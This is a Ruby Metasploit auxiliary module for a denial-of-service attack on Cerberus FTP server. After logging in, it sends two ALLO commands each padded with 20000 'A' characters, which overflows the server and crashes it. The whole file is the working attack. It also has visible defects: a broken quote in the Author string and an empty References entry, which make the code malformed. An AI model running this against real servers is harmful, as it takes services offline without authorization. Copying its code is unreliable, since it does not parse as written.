require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Cerberus FTP command ALLO overflow',
			'Description'    => %q{
				 You need to have a valid login
				so you can run ALLO command.
			},
			'Author'         => 'Francis Provencher "Protek Research Lab's",
			'License'        => MSF_LICENSE,
			'Version'        => '1',
			'References'     =>
				
			'DisclosureDate' => 'Aug 24 2009'))

		# They're required
		register_options([
			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
		])
	end

	def run
		return unless connect_login

		print_status("Sending commands...")

		# We want to try to wait for responses to these
		raw_send("ALLO #{'A' * 20000}\r\n")
		raw_send("ALLO #{'A' * 20000}\r\n")

		disconnect
	end
end
